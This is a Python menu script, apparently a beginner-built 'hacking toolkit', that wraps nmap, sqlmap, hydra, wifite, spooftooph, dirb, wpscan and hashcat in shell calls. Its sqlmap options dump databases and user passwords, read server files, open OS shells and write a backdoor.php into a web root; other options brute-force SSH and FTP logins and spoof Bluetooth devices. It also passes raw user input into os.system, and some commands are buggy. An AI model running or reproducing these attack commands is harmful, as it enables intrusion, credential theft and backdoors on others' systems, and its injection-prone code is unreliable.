#!/usr/bin/env python3
#       //=========      //======
#       ||               ||
#       ||               ||
#       \\=========      ||
#                ||      ||
#                ||      ||
#       =========//      \\======
#
#
#Writed by Single Core
#
#Every risk and other thinks are on your own shoulder, we dosen't get it.
#
#If you see the tool exited and backed to Menu know this the proccess is ended!.
#This tool for edication purposes only!.
#use this tool as ethicaly!.
#Github page : https://github.com/singlecore06483
#
#This tool just supports linux system!!!!
#This tool uses 18 tools.


#Imports
import os
import time
import scapy
from scapy.all import *
from time import sleep


class color:
    header = '\033[95m'
    important = '\33[35m'
    notice = '\033[33m'
    okblue = '\033[94m'
    okgreen = '\033[92m'
    warning = '\033[93m'
    red = '\33[91m'
    end = '\033[0m'
    underline = '\033[4m'
    logging = '\33[34m'


def Menu():
    os.system('clear')
    print(color.logging + """             //=========      //======
             ||               ||
             ||               ||
             \\\=========      ||
                      ||      ||
                      ||      ||
             =========//      \\\======""")
    print()
    print(color.red + "             ]--writed by Single Core--[")
    print("         ]https://github.com/singlecore06483[")
    print()
    list = ["1", "2", "3", "4", "5", "6", "0", "99"]
    print(color.end + "[1]--Information gathring")
    print("[2]--Explotation tools")
    print("[3]--Wireless Testing")
    print("[4]--Web Hacking")
    print("[5]--Password Attacks")
    print("[6]--Sniffing and Spoofing")
    print("[0]--Install and Update")
    print("[99]--Exit")
    print()
    choice = input("SC ~# ")
    return choice

def Information_gathring():
    os.system('clear')
    print('88 88d 88 888888  dP"YB')
    print('88 88Yd88 88__   dP   YB')
    print('88 88 Y88 88""   YB   dP')
    print('88 88  Y8 88      dPoYB')
    print()
    list2 = ["1", "2", "3", "4", "00"]
    print("[1]--NMAP (Network Mapper)")
    print("[2]--Setoolkit")
    print("[3]--WPscan")
    print("[4]--Your system information")
    print("[00]--exit")
    print()
    choice2 = input("SC ~# ")
    
    if choice2 == "1":
        Nmap()
    elif choice2 == "2":
        SeToolKit()
    elif choice2 == "3":
        WPSCAN()
    elif choice2 == "4":
        your_system_info()
    elif choice2 == "00":
        Menu()
    else:
        os.system('clear')
        print("There is no option, try again!")
        time.sleep(2)

def Nmap():
    os.system('clear')
    print("-----(NMAP)------")
    print()
    ip = input("Enter IP/Range or Host: ")
    scantypes = ["1", "2", "3", "4", "5", "99"]
    print()                
    print("[1]--O")
    print("[2]--sP")
    print("[3]--sS")
    print("[4]--sW")
    print("[5]--sV")
    print("[99]--exit")
    print()
    type = input("Enter type of scan: ")
    if type == "1":
        os.system('clear')
        os.system(f'sudo nmap -O {ip}')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif type == "2":
        os.system('clear')
        os.system(f'sudo nmap -sP {ip}')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif type == "3":
        os.system('clear')
        os.system(f'sudo nmap -sS {ip}')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif type == "4":
        os.system('clear')
        os.system(f'sudo nmap -sW {ip}')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif type == "5":
        os.system('clear')
        os.system(f'sudo nmap -sV {ip}')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif type == "99":
        exit()
    else:
        os.system('clear')
        print("There is no option, try again!")
        time.sleep(2)

def SeToolKit():
    os.system('clear')
    os.system('setoolkit')

def WPSCAN():
    os.system('clear')
    print("-----(WPscan)-----")
    target = input("Enter Target URL: ")
    list3 = ["1", "2", "3", "4", "99"]
    print()
    print("[1]--u = user enumration")
    print("[2]--p = portocol enumration")
    print("[3]--url = scan url")
    print("[4]--All")
    print("[99]--exit")
    print()
    type2 = input("Enter type of scan: ")
    if type2 == "1":
        os.system('clear')
        os.system(f'sudo wpscan --url {target} u')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif type2 == "2":
        os.system('clear')
        os.system(f'sudo wpscan --url {target} p')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif type2 == "3":
        os.system('clear')
        os.system(f'wpscan --url {target}')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif type2 == "4":
        os.system('clear')
        os.system(f'sudo wpscan --url {target} u p')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif type2 == "99":
        exit()
    else:
        os.system('clear')
        print("There is no option, try again!")
        time.sleep(2)

def your_system_info():
    os.system('clear')
    print("Operating system: ", os.name)
    print("Current working", os.getcwd())
    print("Current User: ", os.uname)
    time.sleep(5)
    Menu()

def Explotation_tools():
    os.system('clear')
    print('888888 Yd  bP 88""Yb 88')
    print('88__    YdbP  88__dP 88')
    print('88""    bPYd  88""   88  .0')
    print('888888 bP  Yd 88     8800d8')
    print()
    print("")
    list4 = ["1", "2", "3", "4", "00"]
    print("[1]--sqlmap")
    print("[2]--Blind SQL Automatic Injection And Exploit")
    print("[3]--Joomla SQL injection Scanner")
    print("[4]--Brute Forcing ssh")
    print("[00]--exit")
    print()
    choice3 = input("SC ~# ")
    
    if choice3 == "1":
        SQLMAP()
    elif choice3 == "2":
        Blind_SQL()
    elif choice3 == "3":
        Joomla_SQL()
    elif choice3 == "4":
        Brute_force_ssh()
    elif choice3 == "00":
        Menu()
    else:
        os.system('clear')
        print("There is no option, try again!")
        time.sleep(2)

def SQLMAP():
    os.system('clear')
    ask2 = input("Do you want to install or update SQLmap? [y, n]: ")
    if ask2 == "y":
        os.system('apt install sqlmap')
    else:
        os.system('clear')
        print("-----(SQLmap)-----")
        target3 = input("Enter target URL: ")
        list5 = ["1", "2", "3", "4", "5", "6", "99"]
        print()
        print("[1]--simple Scan")
        print("[2]--test for SQL Injection Vulnerabilities")
        print("[3]--dump data from database")
        print("[4]--extract sensitive information(3 ways)")
        print("[5]--perform other attack(3 ways)")
        print("[6]--Update SQLmap")
        print("[99]--exit")
        print()
        type3 = input("Enter type of scan or attack: ")
        if type3 == "1":
            os.system('clear')
            os.system(f'sqlmap -u "{target3}" --level=5 --risk=3')
            print()
            print()
            gotomenu = input("Press Enter to quit!")
        elif type3 == "2":
            os.system('clear')
            os.system(f'sqlmap -u "{target3}" --level=5 --risk=3 --dbs')
            print()
            print()
            gotomenu = input("Press Enter to quit!")
        elif type3 == "3":
            os.system('clear')
            os.system(f'sqlmap -u "{target3}" --level=5 --risk=3 --dump')
            print()
            print()
            gotomenu = input("Press Enter to quit!")
        elif type3 == "4":
            os.system('clear')
            list6 = ["1", "2", "3"]
            print("[1]--Extract tables")
            print("[2]--Extract columns")
            print("[3]--Extract users")
            print()
            new3 = input("Choose an option: ")
            if new3 == "1":
                os.system('clear')
                os.system(f'sqlmap -u "{target3}" --level=5 --risk=3 --tables')
                print()
                print()
                gotomenu = input("Press Enter to quit!")
            elif new3 == "2":
                os.system('clear')
                os.system(f'sqlmap -u "{target3}" --level=5 --risk=3 --columns')
                print()
                print()
                gotomenu = input("Press Enter to quit!")
            elif new3 == "3":
                os.system('clear')
                os.system(f'sqlmap -u "{target3}" --level-5 --risk=3 --dump -T users -C username,password')
                print()
                print()
                gotomenu = input("Press Enter to quit!")
        if type3 == "5":
            os.system('clear')
            list7 = ["1", "2", "3"]
            print("[1]--Os-shell attack")
            print("[2]--read a file attack")
            print("[3]--create a backdoor.php attack")
            print()
            new4 = input("Enter type of attack: ")
            if new4 == "1":                        
                os.system('clear')
                os.system(f'sqlmap -u "{target3}" --os-shell')
                print()
                print()
                gotomenu = input("Press Enter to quit!")
            elif new4 == "2":
                os.system('clear')
                pathoffile = input("Enter path of file: ")
                os.system(f'sqlmap -u "{target3}" --file-read {pathoffile}')
                print()
                print()
                gotomenu = input("Press Enter to quit!")
            elif new4 == "3":
                os.system('clear')
                os.system(f'sqlmap -u "{target3}" --file-write /var/www/html/backdoor.php --os-shell')
                print()
                print()
                gotomenu = input("Press Enter to quit!")
        if type3 == "6":
            os.system('clear')
            os.system('sqlmap --update')
            print()
            print()
            gotomenu = input("Press Enter to quit!")
        elif type3 == "99":
            Menu()
        else:
            os.system('clear')
            print("there is no option, try again!")
            time.sleep(2)

def Blind_SQL():
    os.system('clear')
    print("-----Blind SQL Automatic Injection And Exploit-----")
    print()
    new5 = input("Enter target URL: ")
    print("starting...")
    time.sleep(1)
    os.system(f'sqlmap -u "{new5}" --level=5 --risk=3 --dbs --dump --columns --dump')
    print()
    print()
    gotomenu = input("Press Enter to quit!")

def Joomla_SQL():
    os.system('clear')
    print("-----Joomla SQL injection Scanner-----")
    print()
    target4 = input("Enter target URL: ")
    print("Starting...")
    time.sleep(1)
    os.system(f'sqlmap -u "{target4}" --level=5 --risk=3 --dbs --tables')
    print()
    print()
    gotomenu = input("Press Enter to quit!")

def Brute_force_ssh():
    os.system('clear')
    print("-----Brute Forcing ssh-----")
    print()
    print("[1]--with one username and one password")
    print("[2]--with one username and path of password")
    print("[3]--with path of username and password")
    print("[4]--with path of username and one password")
    print("[99]--exit")
    print()
    choose2 = input("choose type of brute force: ")
    
    if choose2 == "1":
        os.system('clear')
        username = input("enter target username: ")
        password = input("enter target password: ")
        print()
        print("starting...")
        time.sleep(1)
        os.system(f'hydra -l {username} -p {password} ssh')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif choose2 == "2":
        os.system('clear')
        username2 = input("Enter target username: ")
        pathpassword = input("Enter path of password: ")
        print("starting...")
        time.sleep(1)
        os.system(f'hydra -l {username2} -P {pathpassword} ssh')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif choose2 == "3":
        os.system('clear')
        pathuser = input("Enter path of username: ")
        pathpass = input("Enter path of password: ")
        print("starting...")
        time.sleep(1)
        os.system(f'hydra -L {pathuser} -P {pathpass} ssh')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif choose2 == "4":
        os.system('clear')
        pathusername = input("Enter path of username: ")
        password2 = input("Enter target password: ")
        time.sleep(1)
        os.system(f'hydra -L {pathusername} -p {password2} ssh')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif choose2 == "99":
        Menu()
    else:
        os.system('clear')
        print("there is no option, try again!")
        time.sleep(2)

def Wireless_Testing():
    os.system('clear')
    print('Yd        bP 88 88""Yb 888888 88     888888 .dP"Y8 .dP"Y8')
    print(' Yd  db  bP  88 88__dP 88__   88     88__   `Ydo." `Ydo."')
    print('  YddPYbbP   88 88"yb  88""   88  .o 88""   o.`y8b o.`y8b')
    print('   YP  YP    88 88  Yb 888888 88ood8 888888 8bodP" 8bodP"')
    print()
    list9 = ["1", "2", "00"]
    print("[1]--Wifite")
    print("[2]--spooftooth")
    print("[00]--exit")
    print()
    choice4 = input("SC ~# ")

    if choice4 == "1":
        WIFITE()
    elif choice4 == "2":
        SPOOFTOOPH()
    elif choice4 == "00":
        Menu()
    else:
        os.system('clear')
        print("There is no option, try again!")
        time.sleep(2)

def WIFITE():
    os.system('clear')
    print("-----wifite-----")
    print()
    list10 = ["1", "2"]
    print("[1]--start wifite")
    print("[2]--exit")
    print()
    ask3 = input("Choose an option: ")
    if ask3 == "1":
        yesorno = input("Do you want to install wifite? [y, n]: ")
    if yesorno == "y":
        os.system('clear')
        os.system('sudo apt install wifite')
    else:
        os.system('clear')
        os.system('sudo wifite')
    if ask3 == "2":
        Menu()
    else:
        os.system('clear')
        print("there is no option, try again!")
        time.sleep(2)
    
def SPOOFTOOPH():
    os.system('clear')
    print("-----spooftooph-----")
    print()
    ask4 = input("Enter new BD_ADDRESS: ")
    ask5 = input("Enter number of blutooth profiles to display per page: ")
    ask6 = input("Do you want to Disable banner for smaller screens(like phones): [y, n]")
    ask7 = input("Enter new Class: ")
    ask8 = input("Enter interface: ")
    ask9 = input("Enter new name: ")
    ask10 = input("Do you want to assign random NAME, CLASS and ADDRESS: [y, n]")
    ask11 = input("Enter time to clone device in range: ")
    ask12 = input("Write to CSV logfile? [y, n]: ")
    if ask6 and ask10 and ask12 == "y":
        os.system('clear')
        ask13 = input("Enter file name to save(-B and -R are specifyed!): ")
        os.system(f'spooftooph -a {ask4} -b {ask5} -B -c {ask7} -i {ask8} -n {ask9} -R -t {ask11} -w {ask13}')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif ask6 and ask10 == "y":
        os.system('clear')
        os.system(f'spooftooph -a {ask4} -b {ask5} -B -c {ask7} -i {ask8} -n {ask9} -R -t {ask11}')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif ask6 == "y":
        os.system('clear')
        os.system(f'spooftooph -a {ask4} -b {ask5} -B -c {ask7} -i {ask8} -n {ask9} -t {ask11}')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif ask10 and ask12 == "y":
        os.system('clear')
        ask14 = input("Enter file name to save(-R is specifyed!): ")
        os.system(f'spooftooph -a {ask4} -b {ask5} -c {ask7} -i {ask8} -n {ask9} -R -t {ask11} -w {ask14}')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif ask10 == "y":
        os.system('clear')
        os.system(f'spooftooph -a {ask4} -b {ask5} -c {ask7} -i {ask8} -n {ask9} -R -t {ask11}')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif ask12 == "y":
        os.system('clear')
        ask15 = input("Enter file name to save: ")
        os.system(f'spooftooph -a {ask4} -b {ask5} -c {ask7} -i {ask8} -n {ask9} -t {ask11} -w {ask15}')
        print()
        print()
        gotomenu = input("Press Enter to quit!")

def WEB_hacking():
    os.system('clear')
    print('Yd        bP 888888 88""yb')
    print(' Yd  db  bP  88__   88__dP')
    print('  YbdPYbdP   88""   88""yb')
    print('   YP  YP    888888 88oodP')
    print()
    list11 = ["1", "2", "3", "4", "5", "00"]
    print("[1]--Directory Finder")
    print("[2]--Wordpress scanner")
    print("[3]--remote to web")
    print("[4]--host is or down?")
    print("[5]--find vulnerabilite")
    print("[00]--exit")
    print()
    choice5 = input("SC ~# ")

    if choice5 == "1":
        Directory_finder()
    elif choice5 == "2":
        Wordpress_scanner()
    elif choice5 == "3":
        remote_to_web()
    elif choice5 == "4":
        host_is_up()
    elif choice5 == "5":
        find_vulnerabilite()
    elif choice5 == "00":
        Menu()
    else:
        os.system('clear')
        print("There is no option, try again!")
        time.sleep(2)

def Directory_finder():
    os.system('clear')
    print("-----Directory finder(Dirb)-----")
    print()
    list12 = ["1", "2", "99"]
    print("[1]--Find Directory with own list")
    print("[2]--Find Directory with your list")
    print("[99]--exit")
    print()
    ask16 = input("Choose an option: ")
    if ask16 == "1":
        os.system('clear')
        target5 = input("Enter target URL(https://example.com or http://): ")
        os.system(f'dirb {target5}')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif ask16 == "2":
        os.system('clear')
        target6 = input("Enter target URL(https://example.com or http://): ")
        wordlist = input("Enter your wordlist path: ")
        os.system(f'dirb {target6} {wordlist} -f')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif ask16 == "99":
        Menu()
    else:
        os.system('clear')
        print("there is no option, try again!")
        time.sleep(2)
    
def Wordpress_scanner():
    os.system('clear')
    print("-----Wordpress Scanner-----")
    print()
    list13 = ["1", "2"]
    print("[1]--Start Scanning")
    print("[2]--exit")
    print()
    choose3 = input("Choose an option: ")
    if choose3 == "1":
        os.system('clear')
        target7 = input("Enter target URL: ")
        os.system(f'wpscan --url {target7}')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif choose3 == "2":
        Menu()
    else:
        os.system('clear')
        print("there is no option, try again!")
        time.sleep(2)

def remote_to_web():
    os.system('clear')
    print("-----Remote To Web-----")
    print()
    list14 = ["1", "2", "99"]
    print("[1]--MYSQL")
    print("[2]--os shell")
    print("[99]--exit")
    print()
    choose4 = input("Choose an option: ")
    if choose4 == "1":
        os.system('clear')
        print("-----MYSQL-----")
        print()
        list15 = ["1", "2", "3", "99"]
        print("[1]--connect to the server with out username and password")
        print("[2]--connect to server")
        print("[3]--run mysql script file")
        print("[99]--exit")
        print()
        choose5 = input("choose an option: ")
        if choose5 == "1":
            os.system('clear')
            ask17 = input("Enter target server IP: ")
            print("trying to connect...")
            os.system(f'mysql -h {ask17}')
            print()
            print()
            gotomenu = input("Press Enter to quit!")
        elif choose5 == "2":
            os.system('clear')
            targetusername = input("Enter target server username: ")
            targetip = input("Enter target server IP: ")
            targetdatabase = input("Enter target server database name: ")
            print("trying to connect...")
            os.system(f'mysql -u {targetusername} -p -h {targetip} {targetdatabase}')
            print()
            print()
            gotomenu = input("Press Enter to quit!")
        elif choose5 == "3":
            os.system('clear')
            targetusername2 = input("Enter target server username: ")
            targetip2 = input("Enter target server IP: ")
            targetdatabase2 = input("Enter target server database name: ")
            mysqlscript = input("Enter MySQL script: ")
            print("trying to connect...")
            os.system(f'mysql -u {targetusername2} -p -h {targetip2} {targetdatabase2} < {mysqlscript}')
            print()
            print()
            gotomenu = input("Press Enter to quit!")
        elif choose4 == "2":
            os.system('clear')
            new6 = input("Enter target URL: ")
            os.system(f'sqlmap -u "{new6}" --os-shell')
            print()
            print()
            gotomenu = input("Press Enter to quit!")
        elif choose4 == "99":
            Menu()
        else:
            os.system('clear')
            print("there is no option, try again!")
            time.sleep(2)

def host_is_up():
    os.system('clear')
    print("-----host is up or down?-----")
    print()
    list16 = ["1", "2", "99"]
    print("[1]--ping the target")
    print("[2]--nmap scan")
    print("[99]--exit")
    print()
    choose6 = input("Choose an option: ")
    if choose6 == "1":
        os.system('clear')
        target8 = input("Enter Target IP Address or a website(without https:// or http://): ")
        print("Start pinging...")
        os.system(f'ping {target8}')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif choose6 == "2":
        os.system('clear')
        target9 = input("Enter Target IP Address or a website(Enter IP of the website): ")
        print("start scanning...")
        os.system(f'nmap -sP {target9}')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif choose6 == "99":
        Menu()
    else:
        os.system('clear')
        print("there is no option, try again!")
        time.sleep(2)

def find_vulnerabilite():
    os.system('clear')
    print("-----find vulnerabilite-----")
    print()
    target10 = input("Enter target URL: ")
    print("starting...")
    time.sleep(1)
    os.system(f'sqlmap -u "{target10}" --dbs')
    print()
    print()
    gotomenu = input("Press Enter to quit!")

def Password_Attacks():
    os.system('clear')
    print('888888     b0d     .dP"Y8 .dP"Y8')
    print('88__88    dY Yb    `Ydo." `Ydo."')
    print('88""     dY888Yb   o.`y8b o.`y8b')
    print('88      dY     Yb  8bodP" 8bodP')
    print()
    list17 = ["1", "2", "00"]
    print("[1]--Online password attack")
    print("[2]--Offline password attacks")
    print("[00]--exit")
    print()
    choice6 = input("SC ~# ")

    if choice6 == "1":
        Online_pass_attc()
    elif choice6 == "2":
        Offline_pass_attc()
    elif choice6 == "00":
        Menu()
    else:
        os.system('clear')
        print("there is no option, try again!")
        time.sleep(2)

def Online_pass_attc():
    os.system('clear')
    print("-----Online Password Attack(hydra)-----")
    print()
    list18 = ["1", "2"]
    print("[1]--Start")
    print("[2]--exit")
    print()
    choose7 = input("choose an option: ")
    if choose7 == "1":
        os.system('clear')
        ask18 = input("Do you want to install hydra? [y, n]: ")
    if ask18 == "y":
        os.system('clear')
        os.system('sudo apt install hydra')
    elif ask18 == "n":
        os.system('clear')
        new7 = input("Enter target IP Address: ")
        passlist = input("Enter password list: ")
        targetusername3 = input("Enter target username: ")
        print()
        print("Start attacking...")
        time.sleep(1)
        os.system(f'hydra -l {targetusername3} -P {passlist} ftp://{new7}')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif choose7 == "2":
        exit()
    else:
        os.system('clear')
        print("there is no option, try again!")
        time.sleep(2)

def Offline_pass_attc():
    os.system('clear')
    print("-----Offline Password Attack(hashcat, john)-----")
    print()
    list19 = ["1", "2", "99"]
    print("[1]--hashcat")
    print("[2]--john the ripper")
    print("[99]--exit")
    print()
    choose8 = input("Choose an option: ")
    if choose8 == "1":
        os.system('clear')
        print("""        0 | Straight
        1 | Combination
        3 | Brute-force
        6 | Hybrid Wordlist + Mask
        7 | Hybrid Mask + Wordlist
        9 | Association""")
        print()
        new8 = input("Choose an attack mode: ")
        os.system('clear')
        print("""    
    900 | MD4                                                        | Raw Hash
      0 | MD5                                                        | Raw Hash
    100 | SHA1                                                       | Raw Hash
   1300 | SHA2-224                                                   | Raw Hash
   1400 | SHA2-256                                                   | Raw Hash
  10800 | SHA2-384                                                   | Raw Hash
   1700 | SHA2-512                                                   | Raw Hash
  17300 | SHA3-224                                                   | Raw Hash
  17400 | SHA3-256                                                   | Raw Hash
  17500 | SHA3-384                                                   | Raw Hash
  17600 | SHA3-512                                                   | Raw Hash
   6000 | RIPEMD-160                                                 | Raw Hash
    600 | BLAKE2b-512                                                | Raw Hash
  11700 | GOST R 34.11-2012 (Streebog) 256-bit, big-endian           | Raw Hash
  11800 | GOST R 34.11-2012 (Streebog) 512-bit, big-endian           | Raw Hash
   6900 | GOST R 34.11-94                                            | Raw Hash
  17010 | GPG (AES-128/AES-256 (SHA-1($pass)))                       | Raw Hash
   5100 | Half MD5                                                   | Raw Hash
  17700 | Keccak-224                                                 | Raw Hash
  17800 | Keccak-256                                                 | Raw Hash
  17900 | Keccak-384                                                 | Raw Hash
  18000 | Keccak-512                                                 | Raw Hash
   6100 | Whirlpool                                                  | Raw Hash
  10100 | SipHash                                                    | Raw Hash
     70 | md5(utf16le($pass))                                        | Raw Hash
    170 | sha1(utf16le($pass))                                       | Raw Hash
   1470 | sha256(utf16le($pass))                                     | Raw Hash
  10870 | sha384(utf16le($pass))                                     | Raw Hash
   1770 | sha512(utf16le($pass))                                     | Raw Hash
    610 | BLAKE2b-512($pass.$salt)                                   | Raw Hash salted and/or iterated
    620 | BLAKE2b-512($salt.$pass)                                   | Raw Hash salted and/or iterated
     10 | md5($pass.$salt)                                           | Raw Hash salted and/or iterated
     20 | md5($salt.$pass)                                           | Raw Hash salted and/or iterated
   3800 | md5($salt.$pass.$salt)                                     | Raw Hash salted and/or iterated
   3710 | md5($salt.md5($pass))                                      | Raw Hash salted and/or iterated
   4110 | md5($salt.md5($pass.$salt))                                | Raw Hash salted and/or iterated
   4010 | md5($salt.md5($salt.$pass))                                | Raw Hash salted and/or iterated
  21300 | md5($salt.sha1($salt.$pass))                               | Raw Hash salted and/or iterated
     40 | md5($salt.utf16le($pass))                                  | Raw Hash salted and/or iterated
   2600 | md5(md5($pass))                                            | Raw Hash salted and/or iterated
   3910 | md5(md5($pass).md5($salt))                                 | Raw Hash salted and/or iterated
   3500 | md5(md5(md5($pass)))                                       | Raw Hash salted and/or iterated
   4400 | md5(sha1($pass))                                           | Raw Hash salted and/or iterated
   4410 | md5(sha1($pass).$salt)                                     | Raw Hash salted and/or iterated
  20900 | md5(sha1($pass).md5($pass).sha1($pass))                    | Raw Hash salted and/or iterated
  21200 | md5(sha1($salt).md5($pass))                                | Raw Hash salted and/or iterated
   4300 | md5(strtoupper(md5($pass)))                                | Raw Hash salted and/or iterated
     30 | md5(utf16le($pass).$salt)                                  | Raw Hash salted and/or iterated
    110 | sha1($pass.$salt)                                          | Raw Hash salted and/or iterated
    120 | sha1($salt.$pass)                                          | Raw Hash salted and/or iterated
   4900 | sha1($salt.$pass.$salt)                                    | Raw Hash salted and/or iterated
   4520 | sha1($salt.sha1($pass))                                    | Raw Hash salted and/or iterated
  24300 | sha1($salt.sha1($pass.$salt))                              | Raw Hash salted and/or iterated
    140 | sha1($salt.utf16le($pass))                                 | Raw Hash salted and/or iterated
  19300 | sha1($salt1.$pass.$salt2)                                  | Raw Hash salted and/or iterated
  14400 | sha1(CX)                                                   | Raw Hash salted and/or iterated
   4700 | sha1(md5($pass))                                           | Raw Hash salted and/or iterated
   4710 | sha1(md5($pass).$salt)                                     | Raw Hash salted and/or iterated
  21100 | sha1(md5($pass.$salt))                                     | Raw Hash salted and/or iterated
  18500 | sha1(md5(md5($pass)))                                      | Raw Hash salted and/or iterated
   4500 | sha1(sha1($pass))                                          | Raw Hash salted and/or iterated
   4510 | sha1(sha1($pass).$salt)                                    | Raw Hash salted and/or iterated
   5000 | sha1(sha1($salt.$pass.$salt))                              | Raw Hash salted and/or iterated
    130 | sha1(utf16le($pass).$salt)                                 | Raw Hash salted and/or iterated
   1410 | sha256($pass.$salt)                                        | Raw Hash salted and/or iterated
   1420 | sha256($salt.$pass)                                        | Raw Hash salted and/or iterated
  22300 | sha256($salt.$pass.$salt)                                  | Raw Hash salted and/or iterated
  20720 | sha256($salt.sha256($pass))                                | Raw Hash salted and/or iterated
  21420 | sha256($salt.sha256_bin($pass))                            | Raw Hash salted and/or iterated
   1440 | sha256($salt.utf16le($pass))                               | Raw Hash salted and/or iterated
  20800 | sha256(md5($pass))                                         | Raw Hash salted and/or iterated
  20710 | sha256(sha256($pass).$salt)                                | Raw Hash salted and/or iterated
  21400 | sha256(sha256_bin($pass))                                  | Raw Hash salted and/or iterated
   1430 | sha256(utf16le($pass).$salt)                               | Raw Hash salted and/or iterated
  10810 | sha384($pass.$salt)                                        | Raw Hash salted and/or iterated
  10820 | sha384($salt.$pass)                                        | Raw Hash salted and/or iterated
  10840 | sha384($salt.utf16le($pass))                               | Raw Hash salted and/or iterated
  10830 | sha384(utf16le($pass).$salt)                               | Raw Hash salted and/or iterated
   1710 | sha512($pass.$salt)                                        | Raw Hash salted and/or iterated
   1720 | sha512($salt.$pass)                                        | Raw Hash salted and/or iterated
   1740 | sha512($salt.utf16le($pass))                               | Raw Hash salted and/or iterated
   1730 | sha512(utf16le($pass).$salt)                               | Raw Hash salted and/or iterated
     50 | HMAC-MD5 (key = $pass)                                     | Raw Hash authenticated
     60 | HMAC-MD5 (key = $salt)                                     | Raw Hash authenticated
    150 | HMAC-SHA1 (key = $pass)                                    | Raw Hash authenticated
    160 | HMAC-SHA1 (key = $salt)                                    | Raw Hash authenticated
   1450 | HMAC-SHA256 (key = $pass)                                  | Raw Hash authenticated
   1460 | HMAC-SHA256 (key = $salt)                                  | Raw Hash authenticated
   1750 | HMAC-SHA512 (key = $pass)                                  | Raw Hash authenticated
   1760 | HMAC-SHA512 (key = $salt)                                  | Raw Hash authenticated
  11750 | HMAC-Streebog-256 (key = $pass), big-endian                | Raw Hash authenticated
  11760 | HMAC-Streebog-256 (key = $salt), big-endian                | Raw Hash authenticated
  11850 | HMAC-Streebog-512 (key = $pass), big-endian                | Raw Hash authenticated
  11860 | HMAC-Streebog-512 (key = $salt), big-endian                | Raw Hash authenticated
  28700 | Amazon AWS4-HMAC-SHA256                                    | Raw Hash authenticated
  11500 | CRC32                                                      | Raw Checksum
  27900 | CRC32C                                                     | Raw Checksum
  28000 | CRC64Jones                                                 | Raw Checksum
  18700 | Java Object hashCode()                                     | Raw Checksum
  25700 | MurmurHash                                                 | Raw Checksum
  27800 | MurmurHash3                                                | Raw Checksum
  14100 | 3DES (PT = $salt, key = $pass)                             | Raw Cipher, Known-plaintext attack
  14000 | DES (PT = $salt, key = $pass)                              | Raw Cipher, Known-plaintext attack
  26401 | AES-128-ECB NOKDF (PT = $salt, key = $pass)                | Raw Cipher, Known-plaintext attack
  26402 | AES-192-ECB NOKDF (PT = $salt, key = $pass)                | Raw Cipher, Known-plaintext attack
  26403 | AES-256-ECB NOKDF (PT = $salt, key = $pass)                | Raw Cipher, Known-plaintext attack
  15400 | ChaCha20                                                   | Raw Cipher, Known-plaintext attack
  14500 | Linux Kernel Crypto API (2.4)                              | Raw Cipher, Known-plaintext attack
  14900 | Skip32 (PT = $salt, key = $pass)                           | Raw Cipher, Known-plaintext attack
  11900 | PBKDF2-HMAC-MD5                                            | Generic KDF
  12000 | PBKDF2-HMAC-SHA1                                           | Generic KDF
  10900 | PBKDF2-HMAC-SHA256                                         | Generic KDF
  12100 | PBKDF2-HMAC-SHA512                                         | Generic KDF
   8900 | scrypt                                                     | Generic KDF
    400 | phpass                                                     | Generic KDF
  16100 | TACACS+                                                    | Network Protocol
  11400 | SIP digest authentication (MD5)                            | Network Protocol
   5300 | IKE-PSK MD5                                                | Network Protocol
   5400 | IKE-PSK SHA1                                               | Network Protocol
  25100 | SNMPv3 HMAC-MD5-96                                         | Network Protocol
  25000 | SNMPv3 HMAC-MD5-96/HMAC-SHA1-96                            | Network Protocol
  25200 | SNMPv3 HMAC-SHA1-96                                        | Network Protocol
  26700 | SNMPv3 HMAC-SHA224-128                                     | Network Protocol
  26800 | SNMPv3 HMAC-SHA256-192                                     | Network Protocol
  26900 | SNMPv3 HMAC-SHA384-256                                     | Network Protocol
  27300 | SNMPv3 HMAC-SHA512-384                                     | Network Protocol
   2500 | WPA-EAPOL-PBKDF2                                           | Network Protocol
   2501 | WPA-EAPOL-PMK                                              | Network Protocol
  22000 | WPA-PBKDF2-PMKID+EAPOL                                     | Network Protocol
  22001 | WPA-PMK-PMKID+EAPOL                                        | Network Protocol
  16800 | WPA-PMKID-PBKDF2                                           | Network Protocol
  16801 | WPA-PMKID-PMK                                              | Network Protocol
   7300 | IPMI2 RAKP HMAC-SHA1                                       | Network Protocol
  10200 | CRAM-MD5                                                   | Network Protocol
  16500 | JWT (JSON Web Token)                                       | Network Protocol
  29200 | Radmin3                                                    | Network Protocol
  19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
  28800 | Kerberos 5, etype 17, DB                                   | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                             | Network Protocol
  28900 | Kerberos 5, etype 18, DB                                   | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
   5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol
  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                             | Network Protocol
   5600 | NetNTLMv2                                                  | Network Protocol
  27100 | NetNTLMv2 (NT)                                             | Network Protocol
